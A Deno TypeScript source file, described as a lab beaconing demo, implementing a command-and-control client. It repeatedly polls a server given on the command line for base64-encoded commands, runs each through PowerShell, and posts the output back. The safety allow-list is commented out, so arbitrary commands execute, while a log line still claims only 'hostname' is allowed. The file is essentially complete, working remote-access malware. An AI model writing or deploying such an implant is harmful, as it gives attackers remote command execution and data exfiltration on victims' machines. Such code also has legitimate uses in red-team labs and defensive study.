// client.ts
// Deno - lab beaconing demo
//
// Uso:
//   deno run --allow-net client.ts <C2_IP_ADDRESS>
//
// Esempio:
//   deno run --allow-net client.ts 192.168.56.10

if (Deno.args.length < 1) {
  console.error("Usage: deno run --allow-net client.ts <C2_IP_ADDRESS>");
  Deno.exit(1);
}

const serverUrl = `http://${Deno.args[0]}:80`;
const checkInterval = 5000;

function b64Encode(text: string): string {
  return btoa(
    String.fromCharCode(...new TextEncoder().encode(text)),
  );
}

function b64Decode(text: string): string {
  const binary = atob(text);
  const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
  return new TextDecoder().decode(bytes);
}

async function executeLabCommand(command: string): Promise<string> {
  const cmd = command.trim().toLowerCase();

  // const allowedCommands = ["hostname", "whoami", "date"];

  // if (!allowedCommands.includes(cmd)) {
  //   return `[errore] comando non consentito: ${command}`;
  // }

  try {
    const process = new Deno.Command("powershell.exe", {
      args: [
        "-NoProfile",
        "-NonInteractive",
        "-Command",
        command,
      ],
      stdout: "piped",
      stderr: "piped",
    });

    const output = await process.output();

    const stdout = new TextDecoder().decode(output.stdout).trim();
    const stderr = new TextDecoder().decode(output.stderr).trim();

    if (stderr) {
      return `${stdout}\n[stderr] ${stderr}`.trim();
    }

    return stdout;
  } catch (error) {
    return `[errore] ${error}`;
  }
}

async function beacon(): Promise<boolean> {
  try {
    const response = await fetch(`${serverUrl}/command`, {
      method: "GET",
      signal: AbortSignal.timeout(10_000),
    });

    if (!response.ok) {
      return true;
    }

    const raw = (await response.text()).trim();

    if (!raw) {
      return true;
    }

    let command: string;

    try {
      command = b64Decode(raw);
    } catch {
      command = raw;
    }

    command = command.trim();

    console.log(`[+] Command received: ${command}`);

    if (command.toLowerCase() === "exit") {
      console.log("[+] Exit command received.");
      return false;
    }

    const output = await executeLabCommand(command);

    console.log(`[+] Output: ${output}`);

    const result = await fetch(`${serverUrl}/result`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        output: b64Encode(output),
      }),
      signal: AbortSignal.timeout(10_000),
    });

    if (!result.ok) {
      console.error(
        `[-] /result returned HTTP ${result.status}`,
      );
    }
  } catch (error) {
    console.error(`[-] Beacon error: ${error}`);
  }

  return true;
}

console.log(`[+] Beacon client started`);
console.log(`[+] Server: ${serverUrl}`);
console.log(`[+] Interval: ${checkInterval / 1000}s`);
console.log(`[+] Allowed command: hostname`);

while (true) {
  const keepRunning = await beacon();

  if (!keepRunning) {
    break;
  }

  await new Promise((resolve) =>
    setTimeout(resolve, checkInterval)
  );
}

console.log("[+] Client terminated.");